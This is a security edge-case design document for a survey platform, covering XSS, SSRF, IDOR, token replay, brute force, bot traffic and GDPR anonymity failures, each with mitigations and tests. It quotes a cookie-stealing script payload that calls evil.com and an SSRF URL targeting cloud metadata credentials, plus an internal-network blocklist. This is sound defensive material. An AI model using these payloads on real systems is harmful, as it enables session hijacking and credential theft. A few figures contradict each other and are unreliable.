# Edge Cases: Security and Compliance — Survey and Feedback Platform

## Overview

This document covers security vulnerabilities, attack vectors, and compliance failure modes specific to the Survey and Feedback Platform. Survey platforms are high-value targets because they collect PII from large numbers of respondents, handle authentication credentials, and have broad attack surfaces including embedded widgets, public response APIs, and webhook delivery endpoints.

**Scope**: Authentication, authorization, injection attacks, SSRF, rate limiting bypass, GDPR compliance, PII leakage in analytics.

**Edge Case IDs**: EC-SEC-001 through EC-SEC-008

---

## EC-SEC-001: JWT Token Replay After Logout (Race Condition in Blacklist)

| Field | Details |
|-------|---------|
| **Failure Mode** | A user logs out and their access token should be invalidated immediately. However, due to a race condition or Redis write failure, the logout event does not successfully add the token's JTI (JWT ID) to the Redis blacklist. An attacker who intercepted the token (e.g., from browser history, logs, or network sniff) can continue making authenticated requests with the "revoked" token until its natural 15-minute expiry. |
| **Impact** | **High** — Unauthorized access to workspace resources for up to 15 minutes post-logout. If access token had elevated privileges (admin role), attacker could export responses, modify surveys, or access team settings. OWASP A07:2021 — Identification and Authentication Failures. |
| **Detection** | Monitor Redis for blacklist write failures: `KeyError` or `ConnectionError` on `SADD jwt:blacklist:{jti}`. CloudWatch alarm on `JWTBlacklistWriteFailure` metric > 0. Anomalous access patterns post-logout: access from expired session tokens that should be blacklisted. AWS CloudTrail tracks API calls for auditing. |
| **Mitigation / Recovery** | 1. Detect blacklist write failure → force-expire the user's session by invalidating ALL refresh tokens for that user: `DEL refresh:{user_id}:*`. 2. If token was confirmed replayed (anomalous access), immediately revoke all sessions for that user and force re-authentication. 3. Increase JWT access token expiry from 15 minutes to 5 minutes for high-risk accounts (admin roles). 4. Notify security team via PagerDuty if >5 blacklist failures per hour. 5. Short-term: restart Redis connection pool to resolve transient connection issues. |
| **Prevention** | 1. **Short-lived access tokens**: 15-minute maximum expiry limits the replay window. 2. **Redis blacklist with fallback**: Use Redis SETNX for blacklist; if write fails, fall back to database blacklist table as authoritative source. 3. **Write confirmation**: Confirm Redis write success before returning logout 200 response. If write fails, return 500 and retry. 4. **Token binding**: Include client fingerprint (IP + User-Agent hash) in JWT claims; validate on each request — replayed tokens from different clients fail fingerprint check. 5. **Audit JWT usage**: Log every JWT validation with JTI; flag if same JTI used from two different IPs within 60 seconds (possible replay). |

### Testing Scenario
1. Log in → receive access token (JTI: abc123).
2. Log out → verify JTI abc123 is in Redis blacklist.
3. Mock Redis SADD to fail on logout.
4. Attempt to use token post-logout.
5. Verify that with Redis fallback to DB blacklist, request is rejected with 401.

---

## EC-SEC-002: Stored XSS via Survey Question Text

| Field | Details |
|-------|---------|
| **Failure Mode** | A malicious survey creator crafts a question title or description containing JavaScript: `<script>document.location='https://evil.com/?c='+document.cookie</script>`. If this text is stored without sanitization and rendered as raw HTML in the survey response view or analytics dashboard, respondents or analysts who view the survey are subject to XSS execution. OWASP A03:2021 — Injection. |
| **Impact** | **Critical** — JavaScript execution in the context of survey-platform.com. Cookie theft (session hijacking), credential harvesting, keylogging, content injection, forced navigation. If attacker targets an analyst dashboard, they gain access to all response data. GDPR breach potential (unauthorized data access). |
| **Detection** | Static analysis: Semgrep rule detects raw HTML rendering without sanitization in frontend components (`dangerouslySetInnerHTML` without sanitizer). Dynamic detection: WAF rule blocks requests containing `<script>` tags in request bodies. CloudWatch metric `WAFBlockedXSSAttempts` alarm > 5/hour. Penetration testing (quarterly). |
| **Mitigation / Recovery** | 1. Immediately identify affected surveys: `SELECT id, title, description FROM questions WHERE title LIKE '%<script%' OR description LIKE '%<script%'`. 2. Strip script tags from existing content: run `bleach.clean()` across all question text and save. 3. Invalidate all active sessions for any user who may have viewed the malicious survey in analytics. 4. Check server access logs for suspicious outbound connections from analyst browsers. 5. Notify affected workspace admin of the incident. |
| **Prevention** | 1. **Backend sanitization at save**: All question text, option labels, and answer text are passed through `bleach.clean(text, tags=ALLOWED_TAGS, strip=True)` before storage. ALLOWED_TAGS = `['b', 'i', 'u', 'em', 'strong', 'br']` (no script, iframe, form, a, img). 2. **Frontend sanitization at render**: DOMPurify.sanitize() applied to all survey content before rendering in React. Never use `dangerouslySetInnerHTML` without DOMPurify. 3. **Content Security Policy**: `Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.survey-platform.com; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'`. 4. **Input validation**: Pydantic validators reject strings containing `<`, `>` characters in fields that should be plain text. 5. **WAF rule**: AWS WAF managed rule group `AWSManagedRulesCommonRuleSet` blocks XSS payloads at the edge. |

### Testing Scenario
1. Attempt to create a question with title `<script>alert(1)</script>`.
2. Verify Pydantic validator rejects or bleach strips the script tag.
3. Verify stored value is sanitized: `<strong>test</strong>` (safe tags allowed).
4. Load survey in browser and confirm no script execution.
5. Verify CSP header in response blocks inline script execution.

---

## EC-SEC-003: IDOR — Analyst Accessing Another Workspace's Response Data

| Field | Details |
|-------|---------|
| **Failure Mode** | An Analyst in Workspace A crafts a request to `GET /api/v1/surveys/{survey_id}/responses` where `survey_id` belongs to Workspace B. If authorization only checks that the user has the Analyst role and not that the survey belongs to the user's workspace, they can access another workspace's response data. OWASP A01:2021 — Broken Access Control. |
| **Impact** | **Critical** — Cross-workspace data exfiltration. PII of respondents from another organization exposed. GDPR Article 5 (data minimisation) and Article 32 (security) violation. Potential for competitive intelligence theft. Regulatory fines and contractual liability. |
| **Detection** | Application-level: Every resource access log includes `workspace_id` from JWT claims vs. `workspace_id` on the resource. Mismatch logged as `UNAUTHORIZED_WORKSPACE_ACCESS` to CloudWatch. Alarm: any count > 0. Security scanning: automated IDOR tests in CI/CD pipeline (using PyTest + custom IDOR test harness). |
| **Mitigation / Recovery** | 1. Identify the breach: query audit_logs for `action='unauthorized_workspace_access'` events. 2. Identify what data was accessed: check access timestamps against survey IDs and correlate to response records viewed. 3. Notify affected workspace (Workspace B) of potential data exposure. 4. Issue GDPR breach notification within 72 hours if PII was accessed. 5. Patch the authorization gap immediately: add `workspace_id` filter to all resource queries. 6. Rotate JWT signing keys to invalidate all existing sessions. |
| **Prevention** | 1. **Mandatory workspace scoping in ALL queries**: `SELECT * FROM surveys WHERE id=:id AND workspace_id=:workspace_id` — never query by ID alone. 2. **PostgreSQL Row-Level Security (RLS)**: Enable RLS on all tenant-scoped tables with policy: `CREATE POLICY workspace_isolation ON surveys USING (workspace_id = current_setting('app.workspace_id')::uuid)`. 3. **Dependency injection for workspace context**: All service methods receive `workspace_id` from verified JWT claims, injected via FastAPI `Depends()`. Never trust workspace_id from request body. 4. **Automated IDOR test suite**: CI/CD runs IDOR tests using two test workspace tokens attempting cross-workspace access on all CRUD endpoints — must all return 403. 5. **Centralized authorization middleware**: `WorkspaceAuthMiddleware` validates workspace ownership before any service method is invoked. |

### Testing Scenario
1. Create two workspaces (WS-A, WS-B), create a survey in WS-B.
2. Authenticate as Analyst in WS-A.
3. Attempt `GET /api/v1/surveys/{ws_b_survey_id}/responses`.
4. Verify 404 (resource not found from WS-A's perspective) or 403 Forbidden.
5. Verify `UNAUTHORIZED_WORKSPACE_ACCESS` event in audit_logs.

---

## EC-SEC-004: Magic Link Token Brute Force

| Field | Details |
|-------|---------|
| **Failure Mode** | Magic link tokens are 32-character hex strings sent via email. If tokens have insufficient entropy, are sequential, or if the brute-force protection endpoint `/api/v1/auth/magic-link/verify` lacks rate limiting, an attacker could enumerate valid tokens to authenticate as arbitrary users. |
| **Impact** | **High** — Account takeover without knowledge of password or access to email. If valid token is guessed, attacker gains full workspace access as the victim user. OWASP A07:2021 — Identification and Authentication Failures. |
| **Detection** | Rate limiting on `/auth/magic-link/verify`: >10 failed attempts from same IP within 5 minutes triggers `MagicLinkBruteForce` CloudWatch alarm. WAF rate-based rule blocks IPs with >50 auth requests per 5 minutes. Log patterns: high volume of 400/401 responses on auth endpoint. |
| **Mitigation / Recovery** | 1. Immediately invalidate ALL pending magic link tokens for affected email domain if brute force detected. 2. Block source IPs at WAF level: `aws wafv2 create-ip-set --addresses [malicious_ips]`. 3. Force password reset for any account that received a magic link request during the attack window. 4. Notify affected users: "Unusual login activity detected on your account. Your login link has been invalidated." 5. Review SIEM logs for any successful auths from suspicious IPs during the attack window. |
| **Prevention** | 1. **High-entropy tokens**: Use `secrets.token_hex(32)` (256 bits of entropy). NIST 800-63B requires at least 112 bits for authentication tokens. 2. **Short TTL**: Magic link tokens expire after 15 minutes. Stored in Redis with TTL: `SETEX magic_link:{token_hash} 900 {user_id}`. 3. **Single-use enforcement**: `GETDEL magic_link:{token_hash}` — atomically get and delete to prevent replay. 4. **Rate limiting per email address**: Maximum 3 magic link requests per email per hour. 5. **Rate limiting on verify endpoint**: `slowapi` with Redis backend — 10 requests per IP per 5 minutes on the verify endpoint. 6. **Per-user lockout**: After 5 failed attempts for same email, lock magic link for that account for 30 minutes. 7. **CAPTCHA on high-failure threshold**: If IP triggers >20 failed verify attempts, require CAPTCHA. |

### Testing Scenario
1. Request magic link for test@example.com.
2. Attempt to verify 11 wrong tokens from same IP within 5 minutes.
3. Verify 429 rate limit response after 10th attempt.
4. Verify `MagicLinkBruteForce` event logged to CloudWatch.
5. Verify valid token from step 1 is rejected (invalidated as precaution after lockout).

---

## EC-SEC-005: GDPR Bulk Data Export Causing OOM

| Field | Details |
|-------|---------|
| **Failure Mode** | A workspace admin submits a GDPR Subject Access Request (SAR) for a workspace with 100,000 respondents and millions of answers. The export endpoint tries to load all data into memory at once, causing the API container to exceed its memory limit (4GB ECS Fargate task) and be OOM-killed. The user receives no data and the platform appears unresponsive. |
| **Impact** | **High** — GDPR Article 15 violation: Data subjects must receive their data within 30 days. An OOM failure blocking the export is a compliance failure. ECS task restart causes brief service disruption. Workspace admin unable to fulfil legal obligations. |
| **Detection** | ECS container OOM kill: CloudWatch metric `MemoryUtilization` > 95% on export task. Container exit code 137 (SIGKILL). Task restart count alarm > 1. Application error log: `MemoryError` in Python traceback. Large export request detected: any SAR export query returning >10,000 records triggers warning log. |
| **Mitigation / Recovery** | 1. Switch export endpoint to streaming: use SQLAlchemy `yield_per(1000)` for chunked DB reads. 2. Stream CSV/JSON directly to S3 using multipart upload (no in-memory buffering). 3. Return a download URL once upload completes rather than serving file inline. 4. For the failed request: notify the requester: "Export failed due to size. We are processing it in batches and will email a download link within 24 hours." 5. Process the export via dedicated Celery worker with higher memory allocation (8GB task). |
| **Prevention** | 1. **Streaming exports**: Never load all records into memory. Use SQLAlchemy `stream_results=True` and `execution_options(yield_per=500)`. 2. **Async export via Celery**: All exports > 1,000 records are processed as background Celery tasks with 8GB memory ECS task definition. 3. **Paginated SAR portal**: GDPR SAR exports provide paginated JSON responses (100 records/page), not single-file downloads for large datasets. 4. **S3 multipart upload**: Stream directly to S3 in 5MB chunks: `boto3.client.create_multipart_upload()` → `upload_part()` (chunked) → `complete_multipart_upload()`. 5. **Pre-check data volume**: Estimate export size before starting; warn user if >50MB and use async path. 6. **Separate ECS task for large exports**: Large SAR exports run on a dedicated `gdpr-export` ECS task with 2 vCPU / 8GB RAM, isolated from API traffic. |

### Testing Scenario
1. Create workspace with 100,000 response sessions.
2. Submit GDPR SAR export request.
3. Verify export is delegated to async Celery worker.
4. Monitor memory usage on export worker task.
5. Verify CSV is uploaded to S3 and download link emailed on completion.

---

## EC-SEC-006: SSRF via Webhook URL Pointing to Internal VPC Endpoint

| Field | Details |
|-------|---------|
| **Failure Mode** | A workspace admin (malicious insider or compromised account) configures a webhook URL pointing to an internal VPC endpoint: `http://169.254.169.254/latest/meta-data/iam/security-credentials/survey-service-role`. When a response is submitted, the webhook service fetches this URL, exposing EC2 instance metadata including IAM role credentials. This is a Server-Side Request Forgery (SSRF) attack. OWASP A10:2021 — SSRF. |
| **Impact** | **Critical** — Complete AWS credential compromise. Attacker obtains IAM role credentials that may allow S3 bucket access, RDS connections, DynamoDB reads, Secrets Manager access. Full platform data exfiltration possible. Incident response and full rotation of all credentials required. CVE pattern: similar to Capital One breach (2019). |
| **Detection** | Webhook URL validator checks against private IP ranges before saving. CloudWatch alarm: any webhook delivery to RFC 1918 IPs or 169.254.x.x. VPC Flow Logs alert: outbound connection from `webhook-service` ECS task to 169.254.169.254. WAF blocks outbound requests to metadata IPs. |
| **Mitigation / Recovery** | 1. Immediately disable the malicious webhook: `UPDATE webhook_endpoints SET is_active=false WHERE url LIKE '%169.254%'`. 2. If metadata endpoint was successfully reached: rotate all IAM role credentials immediately via AWS Console. 3. Revoke and rotate: RDS master password (Secrets Manager rotation), Redis AUTH token, all API keys. 4. Review CloudTrail for any API calls made using the potentially compromised IAM credentials. 5. Report security incident, preserve forensic logs. 6. Notify affected workspace admin of account compromise. |
| **Prevention** | 1. **Webhook URL validation at save**: Pydantic validator resolves the hostname to IP and checks against SSRF blocklist. ```python SSRF_BLOCKED_NETWORKS = [ipaddress.ip_network('169.254.0.0/16'), ipaddress.ip_network('10.0.0.0/8'), ipaddress.ip_network('172.16.0.0/12'), ipaddress.ip_network('192.168.0.0/16'), ipaddress.ip_network('127.0.0.0/8'), ipaddress.ip_network('::1/128')]``` 2. **DNS rebinding protection**: Resolve hostname to IP at validation time AND again at request time; if IPs differ (DNS rebinding), reject. 3. **Outbound network policy**: ECS task security group for webhook-service blocks all outbound to RFC 1918 ranges and 169.254.0.0/16 at AWS security group level (defence in depth). 4. **IMDSv2 enforced**: AWS EC2 IMDSv2 requires PUT request before GET — scripts that simply GET metadata endpoint receive 401. 5. **Principle of least privilege**: webhook-service IAM role only has permissions to write to CloudWatch Logs and read from Secrets Manager (its own secret). No S3, RDS, or DynamoDB permissions. |

### Testing Scenario
1. Attempt to create webhook with URL `http://169.254.169.254/latest/meta-data/`.
2. Verify validator rejects with `422 WEBHOOK_URL_SSRF_BLOCKED`.
3. Attempt DNS rebinding: use a domain that resolves to 10.0.0.1.
4. Verify both validation-time and request-time IP checks catch the rebinding.
5. Verify ECS security group blocks outbound to 169.254.0.0/16 (confirm with VPC Flow Logs).

---

## EC-SEC-007: Distributed Rate Limit Bypass via IP Rotation

| Field | Details |
|-------|---------|
| **Failure Mode** | An attacker uses a botnet or Tor exit nodes to distribute API requests across 50-100 different IP addresses, each staying below the per-IP rate limit (100 req/min). Total effective rate is 5,000-10,000 req/min — enough to flood the response submission endpoint, overwhelm the database, or perform credential stuffing on the auth endpoints. |
| **Impact** | **High** — Service degradation or DoS for legitimate users. Database connection pool exhaustion. Fake response injection (ballot stuffing) corrupting survey analytics. Attacker can use this to submit thousands of fake NPS responses to manipulate scores. Financial cost of excessive Kinesis writes and Lambda invocations. |
| **Detection** | Anomaly: single survey receives >500 responses in 60 seconds from >50 unique IPs. CloudWatch custom metric `ResponseSubmissionRatePerSurvey` alarm > 100/min for any single survey_id. AWS WAF `RateBasedRule` with 5-minute evaluation period. Bot traffic pattern detection: lack of browser fingerprint, identical User-Agent strings, uniform response submission timing (no human variance). |
| **Mitigation / Recovery** | 1. Activate CAPTCHA for targeted survey: `UPDATE surveys SET settings=jsonb_set(settings, '{enable_recaptcha}', 'true') WHERE id=:survey_id`. 2. Block the suspicious IP ranges at WAF level: identify IP range clusters with `SELECT ip_address, COUNT(*) FROM response_sessions WHERE survey_id=:id AND started_at > NOW()-INTERVAL '10 minutes' GROUP BY ip_address HAVING COUNT(*) > 5`. 3. Quarantine suspicious response sessions: `UPDATE response_sessions SET status='disqualified', notes='bot_detected' WHERE id IN (...)`. 4. Enable AWS WAF Bot Control managed rule group for the affected workspace. |
| **Prevention** | 1. **Multi-layer rate limiting**: Per-IP (100/min) + per-survey (500/min across all IPs) + per-fingerprint (1/survey). The per-survey limit prevents distributed IP attacks. 2. **Honeypot field**: Hidden `<input name="hp_email">` in survey form — bots fill this, humans don't. Any submission with honeypot field populated is marked as bot and rejected. 3. **Behavioral analysis**: Submissions with response time < 3 seconds for a 10-question survey are flagged as suspicious (human minimum ~30 seconds). 4. **reCAPTCHA v3**: Score-based CAPTCHA on response submission endpoint; score < 0.5 triggers challenge. 5. **Browser fingerprinting**: Required for all public survey responses; missing or identical fingerprints across multiple submissions flagged as bot. 6. **AWS WAF Bot Control**: Managed rule group detects known bot signatures, headless browsers, and suspicious patterns. |

### Testing Scenario
1. Script 50 concurrent requests to response submission endpoint from mock different IPs.
2. Verify per-survey rate limit (500/min) triggers after 500 total submissions.
3. Verify CAPTCHA is auto-enabled when threshold exceeded.
4. Verify honeypot-filled submissions are rejected with 200 OK (silent discard, not 4xx — to not give bots feedback).

---

## EC-SEC-008: PII Leakage in Cross-Tabulation Analytics (k-Anonymity Violation)

| Field | Details |
|-------|---------|
| **Failure Mode** | A cross-tabulation report combines "Department" × "NPS Score" for a small company survey. One department has only 1 respondent. The cross-tab shows "Engineering: NPS = 0 (1 response)" — revealing that the single Engineering respondent gave a score of 0 (a Detractor). This re-identifies an individual despite survey anonymization. |
| **Impact** | **High** — GDPR Article 5(1)(c) data minimisation violation. Individual employee identified as a detractor, potentially exposing them to retaliation. Trust in survey anonymity broken — future participation reduced. GDPR Art. 83 fine potential for processing that enables re-identification. |
| **Detection** | Application-level check: After cross-tab computation, scan result for cells with response count < k (k=5). Log `KAnonymityViolation` event with survey_id, question pair, and cell count. Data scientist review of cross-tab queries in staging. Automated test: unit tests verify k-anonymity enforcement on cross-tab output. |
| **Mitigation / Recovery** | 1. Retroactively patch cross-tab report to suppress cells with count < 5: replace exact counts with `"<5"` and suppress the actual value. 2. If report was already downloaded or emailed: reach out to recipient (analyst) asking them to disregard the fine-grained cells and resend the suppressed version. 3. Review all other cross-tab reports generated in the last 30 days for k-anonymity violations. 4. Document as GDPR near-miss incident; no formal notification required if re-identification risk was detected and contained. |
| **Prevention** | 1. **k-Anonymity enforcement in CrossTabEngine**: After computing all cells, suppress any cell where `response_count < K_THRESHOLD` (K_THRESHOLD = 5): ```python if cell_count < K_THRESHOLD: cell_value = "<5" cell_count = None```. 2. **Suppress entire row/column if too many suppressed cells**: If >50% of cells in a row are suppressed, suppress the entire row. 3. **Minimum sample size warning**: Show warning when generating cross-tab on surveys with < 30 total responses. 4. **Sensitive question detection**: Flag questions that could enable re-identification (department, office location, job title) and apply stricter k=10 threshold. 5. **Differential privacy option** (Enterprise tier): Apply Laplace noise to aggregated metrics for mathematically provable privacy. 6. **User education**: Tooltip in analytics UI: "Cells with fewer than 5 responses are suppressed to protect respondent anonymity." |

### Testing Scenario
1. Create survey with cross-tab questions (Department × NPS).
2. Submit 1 response from "Engineering" department.
3. Request cross-tabulation.
4. Verify the Engineering cell shows `"<5"` instead of exact count and NPS value.
5. Verify K_THRESHOLD=5 is configurable per workspace (Enterprise: custom k value).

---

## Security Incident Response Runbook

### P1 Security Incident (Active Breach / Data Exfiltration)
1. **Detect and Contain** (0-15 minutes): Isolate affected service (ECS task stop), block suspected IP ranges at WAF, revoke potentially compromised credentials.
2. **Assess** (15-60 minutes): Identify blast radius — what data was accessed, how many users/workspaces affected, is breach ongoing.
3. **Notify Internal** (within 1 hour): CISO, CTO, Legal, DPO notified via PagerDuty P1 escalation.
4. **Preserve Evidence** (within 2 hours): Capture CloudTrail logs, VPC Flow Logs, application logs to S3 for forensics. Do not rotate logs.
5. **Notify Affected Users** (within 24 hours): Email notification to affected workspace admins.
6. **DPA Notification** (within 72 hours if personal data breach): File GDPR Article 33 notification with supervisory authority.
7. **Post-Incident Review** (within 7 days): RCA document, timeline, remediation actions, process improvements.

---

## Compliance Checklist

| GDPR Article | Requirement | Implementation | Status |
|-------------|------------|----------------|--------|
| Art. 5 | Lawful basis for processing | Consent recorded at response submission | ✅ |
| Art. 5(1)(c) | Data minimisation | k-anonymity in cross-tab, no unnecessary PII collection | ✅ |
| Art. 13/14 | Privacy notice | Respondent-facing privacy notice link in survey footer | ✅ |
| Art. 15 | Right of access | SAR export via GDPR portal | ✅ |
| Art. 17 | Right to erasure | Contact unsubscribe + response deletion endpoint | ✅ |
| Art. 20 | Data portability | JSON/CSV export for respondent data | ✅ |
| Art. 25 | Privacy by design | Workspace isolation, data minimisation defaults | ✅ |
| Art. 32 | Security of processing | Encryption at rest/transit, WAF, RLS, MFA | ✅ |
| Art. 33 | Breach notification | 72-hour DPA notification SOP | ✅ |
| Art. 35 | DPIA | Required for high-risk processing (HR surveys, health surveys) | ⚠️ Workspace responsibility |

---

## Operational Policy Addendum

### Response Data Privacy Policies

All response data is processed under GDPR Article 6(1)(a) (consent) or 6(1)(f) (legitimate interests), depending on the workspace's configuration. PII in responses (email, name, IP) is encrypted at rest via AWS KMS AES-256. Cross-workspace data access is prevented by PostgreSQL Row-Level Security and JWT workspace claims. Security incidents involving personal data are treated as potential GDPR breaches; DPA notification is filed within 72 hours if personal data was accessed by unauthorized parties. All security events are logged in `audit_logs` with 12-month retention.

### Survey Distribution Policies

Security controls for distribution include: sender domain verification (SPF/DKIM) to prevent email spoofing, SSRF protection on webhook URLs, CSRF protection on all state-changing endpoints (double-submit cookie pattern), and rate limiting on auth endpoints to prevent credential stuffing. Magic link tokens use 256 bits of entropy and expire after 15 minutes.

### Analytics and Retention Policies

Security and compliance incidents are retained in `audit_logs` for 24 months. GDPR SAR exports are stored encrypted in S3 for 30 days then deleted. Cross-tabulation results apply k-anonymity with k≥5 threshold before serving to clients. Security logs (CloudWatch, CloudTrail, VPC Flow Logs) are retained for 12 months in S3 with Glacier archival for months 4-12.

### System Availability Policies

Security controls must not degrade availability below SLA thresholds. WAF rules are tested in count mode for 48 hours before switching to block mode. Rate limits are calibrated based on P99 legitimate request rates + 5x headroom to avoid false positives. DDoS protection is provided by AWS Shield Standard on all CloudFront distributions and ALBs. Incident response SLA: P1 containment within 1 hour, P2 within 4 hours, P3 within 24 hours.
